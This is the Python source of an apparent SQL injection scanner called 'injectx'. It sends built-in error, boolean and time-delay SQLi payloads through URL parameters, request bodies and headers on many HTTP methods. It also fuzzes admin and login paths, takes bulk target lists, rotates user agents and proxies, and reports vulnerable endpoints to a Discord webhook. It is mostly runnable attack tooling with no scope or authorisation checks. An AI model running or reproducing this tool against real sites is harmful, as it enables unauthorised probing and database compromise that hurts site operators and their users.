#!/usr/bin/env python3
# injectx – ultra-fast asynchronous SQL-Injection scanner
# MIT License.  © 2025 injectx authors.

"""
injectx
=======

> “Scan smarter, inject faster.”

A single-file, fully-typed SQLi triage engine:

* **Async HTTP/2** with connection pooling
* Error / Boolean / Time-based payloads
* Header, body, and query-parameter injection
* Multi-verb coverage (GET, POST, PUT, PATCH, HEAD, OPTIONS)
* Path fuzzing (`/admin/`, `/login`, `/search`, …)
* Proxy switch (`--proxy`)
* Discord webhook alerts (`--webhook`)
* JSONL output ready for pipelines
"""

from __future__ import annotations

import asyncio
import json
import os
import random
import re
import sys
from dataclasses import dataclass, asdict
from pathlib import Path
from typing import Iterable, Optional
from urllib.parse import urljoin, urlsplit

import httpx
import typer
from loguru import logger
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TimeElapsedColumn

__version__ = "0.9.0"

# ──────────────────────────── CLI scaffold ──────────────────────────── #

app = typer.Typer(add_completion=False, no_args_is_help=True)
console = Console()

# ───────────────────────── Configuration ────────────────────────────── #

PAYLOADS_ERROR: list[str] = [
    "'\"",
    "';",
    "\";",
    "' OR 1=1--",
    "\" OR 1=1--",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
]
PAYLOADS_BOOLEAN: list[str] = [
    "' AND 1=0--",
    "\" AND 1=0--",
    "' AND 1=1--",
    "\" AND 1=1--",
]
PAYLOADS_TIME: list[str] = [
    "'; WAITFOR DELAY '0:0:5'--",
    "\"; WAITFOR DELAY '0:0:5'--",
]

HEADERS_TO_INJECT = ["User-Agent", "X-Forwarded-For", "X-Client-IP"]
HTTP_METHODS = ["GET", "POST", "PUT", "PATCH", "HEAD", "OPTIONS"]
FUZZ_PATHS = ["/admin/", "/login", "/search"]

DBMS_ERRORS: dict[str, str] = {
    "MySQL": r"SQL syntax.*MySQL|Warning.*mysql_",
    "PostgreSQL": r"PostgreSQL.*ERROR|Warning.*pg_",
    "MSSQL": r"Microsoft SQL Server|ODBC SQL Server",
    "Oracle": r"ORA-\d{5}",
    "SQLite": r"SQLite\/JDBCDriver|System\.Data\.SQLite\.SQLiteException",
}

DEFAULT_TIMEOUT = 10
MAX_CONCURRENCY = 50

logger.remove()
logger.add(sys.stderr, level="INFO")

# ─────────────────────────── Data model ──────────────────────────────── #


@dataclass(slots=True, frozen=True)
class ScanResult:
    url: str
    method: str
    vector: str
    payload: str
    evidence: str
    dbms: Optional[str]
    response_time: float

    def to_json(self) -> str:
        return json.dumps(asdict(self), ensure_ascii=False)


# ───────────────────────────── Helpers ───────────────────────────────── #


def _random_headers() -> dict[str, str]:
    return {
        "User-Agent": random.choice(
            [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                "Mozilla/5.0 (X11; Linux x86_64)",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            ]
        ),
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
    }


def _detect_dbms(text: str) -> Optional[str]:
    for dbms, pattern in DBMS_ERRORS.items():
        if re.search(pattern, text, re.I):
            return dbms
    return None


# ─────────────────────────── HTTP engine ─────────────────────────────── #


class RequestEngine:
    """Thin async wrapper around httpx with proxy compatibility."""

    def __init__(
        self,
        timeout: int = DEFAULT_TIMEOUT,
        concurrency: int = MAX_CONCURRENCY,
        proxy_url: Optional[str] = None,
    ) -> None:
        limits = httpx.Limits(
            max_keepalive_connections=concurrency, max_connections=concurrency
        )
        client_kwargs: dict = {
            "timeout": timeout,
            "limits": limits,
            "headers": _random_headers(),
            "http2": True,
            "follow_redirects": True,
        }
        if proxy_url:
            try:
                client_kwargs["transport"] = httpx.HTTPTransport(proxy=proxy_url)
            except TypeError:
                client_kwargs["proxies"] = {"all://": proxy_url}

        self._client = httpx.AsyncClient(**client_kwargs)
        self._sem = asyncio.Semaphore(concurrency)

    async def close(self) -> None:
        await self._client.aclose()

    async def request(
        self,
        method: str,
        url: str,
        *,
        headers: Optional[dict[str, str]] = None,
        data: Optional[dict[str, str]] = None,
    ) -> httpx.Response:
        async with self._sem:
            return await self._client.request(method, url, headers=headers, data=data)


# ───────────────────── Payload generation LUT ────────────────────────── #


class Injector:
    """Generate (method, url, payload, vector, extra_headers, body)."""

    @staticmethod
    def _params(url: str) -> Iterable[tuple]:
        if "?" not in url:
            return
        base, qs = url.split("?", 1)
        pairs = qs.split("&")
        for idx, pair in enumerate(pairs):
            key, _ = pair.split("=", 1)
            for pl in PAYLOADS_ERROR + PAYLOADS_BOOLEAN + PAYLOADS_TIME:
                mutated = pairs.copy()
                mutated[idx] = f"{key}={pl}"
                yield "GET", f"{base}?{'&'.join(mutated)}", pl, "param", None, None

    @staticmethod
    def _body(url: str) -> Iterable[tuple]:
        template = {"q": "test"}
        for key in template:
            for pl in PAYLOADS_ERROR + PAYLOADS_BOOLEAN + PAYLOADS_TIME:
                body = template.copy()
                body[key] = pl
                for method in ("POST", "PUT", "PATCH"):
                    yield method, url, pl, "body", None, body

    @staticmethod
    def _headers(url: str) -> Iterable[tuple]:
        for hdr in HEADERS_TO_INJECT:
            for pl in PAYLOADS_ERROR + PAYLOADS_BOOLEAN + PAYLOADS_TIME:
                custom = {hdr: pl}
                for method in HTTP_METHODS:
                    yield method, url, pl, f"header:{hdr}", custom, None

    @classmethod
    def generate(cls, url: str) -> Iterable[tuple]:
        yield from cls._params(url)
        yield from cls._body(url)
        yield from cls._headers(url)


# ────────────────────── Response analyser / triage ────────────────────── #


class Analyzer:
    @staticmethod
    def evaluate(
        resp: httpx.Response, payload: str, base_status: Optional[int]
    ) -> Optional[tuple[str, Optional[str]]]:
        latency = resp.elapsed.total_seconds()
        snippet = resp.text[:8000]

        if dbms := _detect_dbms(snippet):
            return f"error:{dbms}", dbms

        if payload in PAYLOADS_TIME and latency > 4.5:
            return f"delay:{latency:.1f}s", None

        if payload.endswith("--") and "1=1" in payload and base_status is not None:
            if resp.status_code != base_status:
                return f"status:{base_status}->{resp.status_code}", None
        return None


# ─────────────────────────── Discord alerts ──────────────────────────── #


async def _notify_discord(client: httpx.AsyncClient, webhook: str, res: ScanResult) -> None:
    msg = {
        "content": (
            "🚨 **SQLi Vulnerable**\n"
            f"URL: `{res.url}`\n"
            f"Method: `{res.method}` • Vector: `{res.vector}`\n"
            f"Payload: ```{res.payload}```\n"
            f"Evidence: {res.evidence}"
        )
    }
    try:
        await client.post(webhook, json=msg, timeout=10)
    except Exception as exc:  # noqa: BLE001
        logger.warning(f"Discord alert failed: {exc}")


# ───────────────────────────── Scanner core ──────────────────────────── #


async def _scan_endpoint(
    eng: RequestEngine,
    url: str,
    webhook: Optional[str],
    outfile,
) -> None:
    try:
        base_resp = await eng.request("GET", url)
        base_status = base_resp.status_code
    except Exception:
        base_status = None

    for method, tgt, pl, vec, hdrs, body in Injector.generate(url):
        try:
            hdr = _random_headers()
            if hdrs:
                hdr.update(hdrs)
            resp = await eng.request(method, tgt, headers=hdr, data=body)
        except Exception:
            continue

        if verdict := Analyzer.evaluate(resp, pl, base_status):
            evidence, dbms = verdict
            res = ScanResult(
                url=tgt,
                method=method,
                vector=vec,
                payload=pl,
                evidence=evidence,
                dbms=dbms,
                response_time=resp.elapsed.total_seconds(),
            )
            console.print(f"[bold red]VULNERABLE[/] {tgt} → {evidence}")
            outfile.write(res.to_json() + "\n")
            outfile.flush()
            if webhook:
                await _notify_discord(eng._client, webhook, res)


async def _run(
    targets: list[str],
    proxy: Optional[str],
    webhook: Optional[str],
    out_file: Optional[str],
) -> None:
    eng = RequestEngine(proxy_url=proxy)
    outfile = open(out_file, "a", encoding="utf-8") if out_file else open(os.devnull, "w")

    total = len(targets) * (1 + len(FUZZ_PATHS))
    with Progress(
        SpinnerColumn(),
        "[progress.description]{task.description}",
        TimeElapsedColumn(),
        console=console,
        transient=True,
    ) as bar:
        task = bar.add_task("Scanning", total=total)
        for base in targets:
            split = urlsplit(base)
            root = f"{split.scheme}://{split.netloc}"
            paths = [split.path or "/"] + FUZZ_PATHS
            for p in paths:
                await _scan_endpoint(eng, urljoin(root, p.lstrip("/")), webhook, outfile)
                bar.advance(task)

    await eng.close()
    outfile.close()


# ───────────────────────────── CLI layer ─────────────────────────────── #

@app.command()
def scan(
    target: Optional[str] = typer.Argument(
        None, help="Single target URL or hostname"
    ),
    file: Optional[Path] = typer.Option(
        None, "-f", "--file", exists=True, readable=True, help="File with targets"
    ),
    out: Optional[str] = typer.Option(
        None, "-o", "--out", help="Save JSONL findings to this file"
    ),
    proxy: Optional[str] = typer.Option(
        None, "--proxy", help="Proxy, e.g. http://127.0.0.1:8080"
    ),
    webhook: Optional[str] = typer.Option(
        None, "--webhook", help="Discord webhook URL"
    ),
):
    """Run an async SQL-Injection recon scan."""
    targets: list[str] = []
    if target:
        targets.append(target)
    if file:
        targets += [line.strip() for line in file.read_text().splitlines() if line.strip()]

    if not targets:
        typer.echo("🔴  Provide a target or --file", err=True)
        raise typer.Exit(1)

    typer.echo(f"🚀  Scanning {len(targets)} target(s)…")
    asyncio.run(_run(targets, proxy, webhook, out))


@app.command()
def payloads() -> None:
    """Print built-in payload list."""
    for p in (*PAYLOADS_ERROR, *PAYLOADS_BOOLEAN, *PAYLOADS_TIME):
        typer.echo(p)


# ─────────────────────────── Entrypoint ─────────────────────────────── #

if __name__ == "__main__":
    try:
        app()
    except KeyboardInterrupt:
        typer.echo("⏹️  Interrupted", err=True)
        sys.exit(130)
